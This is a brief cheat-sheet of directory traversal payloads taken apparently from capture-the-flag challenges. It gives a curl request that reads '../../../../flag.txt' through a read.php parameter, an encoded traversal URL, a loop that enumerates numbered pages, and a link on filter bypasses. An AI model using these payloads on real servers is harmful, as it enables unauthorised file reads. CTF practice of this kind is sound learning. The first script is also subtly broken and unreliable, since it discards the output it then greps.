### Directory Traversal

---

```py
#!/bin/bash
curl -X POST "http://saturn.picoctf.net:52472/read.php" -d filename=../../../../flag.txt >/dev/null 2>&1 | grep -ho "picoCTF{.*}"
```

```py
https://vertical-traversal.tuctf.com/get/...%2Fflag.txt
```

```py
for i in $(seq 3000 4000); do curl -s https://directory.web.actf.co/$i.html | grep -v "another file";done
```

[Filtering](https://security.stackexchange.com/questions/96736/path-traversal-filter-bypass-techniques)
